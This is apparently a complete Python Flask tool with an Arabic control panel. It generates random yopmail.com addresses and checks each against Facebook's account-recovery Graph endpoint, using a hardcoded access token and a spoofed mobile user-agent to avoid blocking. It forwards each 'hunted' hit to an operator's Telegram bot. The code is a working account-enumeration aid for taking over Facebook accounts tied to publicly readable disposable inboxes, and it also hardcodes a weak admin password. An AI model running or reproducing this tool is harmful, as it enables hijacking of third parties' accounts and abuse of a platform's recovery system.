import requests
import random
import threading
import time
import os
from flask import Flask, jsonify, request, render_template_string

app = Flask(__name__)

# --- إعدادات المطور ---
DEVELOPER_USER = "admin"
DEVELOPER_PASS = "2003"

data_store = {
    "engine_running": False,
    "good": [],
    "bad": 0,
    "last_checked": "",
    "tg_token": "",
    "tg_id": ""
}

HTML_INTERFACE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ابن الناصرية VIP | Control Panel</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background: #080808; color: #eee; font-family: 'Segoe UI', Tahoma; }
        .gold-border { border: 2px solid #d4af37; box-shadow: 0 0 15px rgba(212, 175, 55, 0.3); }
        .input-dark { background: #151515; border: 1px solid #333; color: #fff; border-radius: 8px; padding: 8px; width: 100%; }
        .btn-tg { background: #0088cc; color: white; }
    </style>
</head>
<body class="p-4">
    <div class="max-w-2xl mx-auto">
        <div class="text-center mb-6">
            <h1 class="text-3xl font-bold text-yellow-500 uppercase italic">فحص ابن الناصرية VIP 👑</h1>
            <p class="text-xs text-gray-500">تم التطوير بواسطة @X262M</p>
        </div>

        <div class="grid grid-cols-2 gap-4 mb-6 text-center">
            <div class="p-4 bg-zinc-900 rounded-xl border-b-4 border-green-600">
                <span class="text-xs block text-gray-400 font-bold">GOOD ✅</span>
                <span id="g_count" class="text-3xl font-bold text-green-400">0</span>
            </div>
            <div class="p-4 bg-zinc-900 rounded-xl border-b-4 border-red-600">
                <span class="text-xs block text-gray-400 font-bold">BAD ❌</span>
                <span id="b_count" class="text-3xl font-bold text-red-400">0</span>
            </div>
        </div>

        <div class="bg-zinc-900 p-6 rounded-2xl mb-6 gold-border">
            <h3 class="text-yellow-500 font-bold mb-4">⚙️ إعدادات البوت (Telegram)</h3>
            <div class="space-y-4">
                <input id="tg_token" type="text" placeholder="Bot Token" class="input-dark text-center">
                <input id="tg_id" type="text" placeholder="Your Telegram ID" class="input-dark text-center">
                <button onclick="saveConfig()" class="w-full btn-tg py-2 rounded-lg font-bold">حفظ الإعدادات ✅</button>
            </div>
        </div>

        <div class="bg-zinc-900 p-6 rounded-2xl mb-6 shadow-inner">
            <p class="text-xs text-blue-400 mb-2 font-mono text-center italic">📡 فحص حالي: <span id="c_mail" class="text-white font-bold">---</span></p>
            <div class="flex gap-2">
                <button onclick="cmd('start')" class="flex-1 bg-green-600 py-4 rounded-xl font-bold shadow-lg">بدء الصيد 🚀</button>
                <button onclick="cmd('stop')" class="flex-1 bg-red-700 py-4 rounded-xl font-bold shadow-lg">إيقاف وتصفير 🛑</button>
            </div>
        </div>

        <div class="bg-zinc-900 p-4 rounded-xl border border-zinc-800 text-center">
            <h4 class="text-sm font-bold text-gray-400 mb-3 underline">إحصائيات الصيد:</h4>
            <div id="hits" class="space-y-2 font-mono text-sm"></div>
        </div>
    </div>

    <script>
        function update() {
            fetch('/stats').then(r => r.json()).then(d => {
                document.getElementById('g_count').innerText = d.good;
                document.getElementById('b_count').innerText = d.bad;
                document.getElementById('c_mail').innerText = d.last;
                let hitsHtml = "";
                for(let i=1; i <= d.good; i++) {
                    hitsHtml = `<div class="p-2 bg-black rounded text-green-400 border-l-4 border-green-600 mb-1 font-bold">تم صيد الحساب رقم : [ ${i} ] ✅</div>` + hitsHtml;
                }
                document.getElementById('hits').innerHTML = hitsHtml || "لا يوجد صيد بعد..";
            });
        }
        function saveConfig() {
            let t = document.getElementById('tg_token').value;
            let i = document.getElementById('tg_id').value;
            fetch(`/save?token=${t}&id=${i}`).then(() => alert("تم الحفظ!"));
        }
        function cmd(a) { fetch('/'+a); }
        setInterval(update, 1500);
    </script>
</body>
</html>
"""

def send_to_telegram(email):
    if data_store["tg_token"] and data_store["tg_id"]:
        msg = f"🎯 صيد جديد ابن الناصرية VIP 🎯\\n\\n📧 Email: `{email}`\\n👨‍💻 المطور: @X262M"
        url = f"https://api.telegram.org/bot{data_store['tg_token']}/sendMessage?chat_id={data_store['tg_id']}&text={msg}&parse_mode=Markdown"
        try: requests.get(url)
        except: pass

def sniper_engine():
    http = requests.Session()
    names = ['ahmed', 'ali', 'saif', 'hassan', 'murtaza', 'zain', 'omar', 'mohammed']
    while data_store["engine_running"]:
        email = f"{random.choice(names)}{random.randint(100, 999)}@yopmail.com"
        data_store["last_checked"] = email
        try:
            # هيدرز الموبايل لتقليل الحظر
            headers = {'User-Agent': 'FBAN/FB4A;FBAV/300.0.0.1.1;'}
            res = http.get(f"https://b-graph.facebook.com/recover_accounts?q={email}&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32", headers=headers, timeout=5).text
            if "contact_point" in res:
                data_store["good"].append(email)
                send_to_telegram(email)
            else:
                data_store["bad"] += 1
            time.sleep(0.1) # تأخير بسيط للسيرفر
        except: continue

@app.route('/')
def login():
    auth = request.authorization
    if not auth or auth.username != DEVELOPER_USER or auth.password != DEVELOPER_PASS:
        return ('Login Required', 401, {'WWW-Authenticate': 'Basic realm="ADMIN"'})
    return render_template_string(HTML_INTERFACE)

@app.route('/save')
def save():
    data_store["tg_token"] = request.args.get('token')
    data_store["tg_id"] = request.args.get('id')
    return jsonify({"status": "saved"})

@app.route('/start')
def start():
    if not data_store["engine_running"]:
        data_store["engine_running"] = True
        threading.Thread(target=sniper_engine, daemon=True).start()
    return "ok"

@app.route('/stop')
def stop():
    data_store["engine_running"] = False
    data_store["good"], data_store["bad"], data_store["last_checked"] = [], 0, "تم التصفير"
    return "ok"

@app.route('/stats')
def stats():
    return jsonify({"good": len(data_store["good"]), "bad": data_store["bad"], "last": data_store["last_checked"]})

if __name__ == '__main__':
    # بورت 10000 هو الافتراضي لأغلب الاستضافات
    app.run(host='0.0.0.0', port=os.environ.get('PORT', 10000))
